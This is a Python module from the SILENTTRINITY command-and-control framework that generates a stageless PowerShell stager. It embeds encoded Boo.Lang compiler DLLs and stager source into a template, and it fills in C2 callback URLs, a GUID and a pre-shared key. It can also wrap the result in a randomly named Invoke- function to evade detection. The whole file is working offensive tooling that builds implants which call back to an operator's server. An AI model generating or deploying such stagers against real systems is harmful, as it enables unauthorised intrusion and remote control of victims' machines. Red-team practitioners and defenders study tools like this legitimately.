import logging
import uuid
from silenttrinity.core.utils import gen_random_string, get_path_in_package
from silenttrinity.core.teamserver.stager import Stager
from silenttrinity.core.teamserver.crypto import gen_stager_psk
from silenttrinity.core.teamserver.comms.utils import gen_stager_code
from silenttrinity.core.teamserver.utils import dotnet_deflate_and_encode


class STStager(Stager):
    def __init__(self):
        self.name = 'powershell_stageless'
        self.description = 'Embeds the BooLang Compiler within PowerShell and directly executes STs stager'
        self.suggestions = ''
        self.extension = 'ps1'
        self.author = '@byt3bl33d3r'
        self.options = {
            'AsFunction': {
                'Description'   :   "Generate stager as a PowerShell function",
                'Required'      :   False,
                'Value'         :   True
            }
        }

    def generate(self, listener):
        with open(get_path_in_package('core/teamserver/data/Boo.Lang.dll'), 'rb') as boolangdll:
            with open(get_path_in_package('core/teamserver/data/Boo.Lang.Compiler.dll'), 'rb') as boolangcompilerdll:
                with open(get_path_in_package('core/teamserver/data/Boo.Lang.Parser.dll'), 'rb') as boolangparserdll:
                    with open(get_path_in_package('core/teamserver/data/Boo.Lang.Extensions.dll'), 'rb') as boolangextensionsdll:
                        with open(get_path_in_package('core/teamserver/stagers/templates/posh_stageless.ps1')) as template:
                            template = template.read()

                            c2_urls = ','.join(
                                filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
                            )
                            guid = uuid.uuid4()
                            psk = gen_stager_psk()

                            if bool(self.options['AsFunction']['Value']) is True:
                                function_name = gen_random_string(6).upper()
                                template = f"""function Invoke-{function_name}
{{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Guid,
        [Parameter(Mandatory=$true)][String]$Psk,
        [Parameter(Mandatory=$true)][String]$Url
    )

    {template}
}}
Invoke-{function_name} -Guid '{guid}' -Psk '{psk}' -Url '{c2_urls}'
"""
                            else:
                                template = template.replace("$Url", f'{c2_urls}')
                                template = template.replace("$Guid", f'{guid}')
                                template = template.replace("$Psk", f'{psk}')

                            template = template.replace("BOOLANG_DLL_GOES_HERE", dotnet_deflate_and_encode(boolangdll.read()))
                            template = template.replace("BOOLANGPARSER_DLL_GOES_HERE", dotnet_deflate_and_encode(boolangparserdll.read()))
                            template = template.replace("BOOLANGCOMPILER_DLL_GOES_HERE", dotnet_deflate_and_encode(boolangcompilerdll.read()))
                            template = template.replace("BOOLANGEXTENSIONS_DLL_GOES_HERE", dotnet_deflate_and_encode(boolangextensionsdll.read()))
                            template = template.replace("SOURCE_CODE_GOES_HERE", gen_stager_code(listener['comms'].split(','), hook_assemblyresolve_event=True))
                            return guid, psk, template
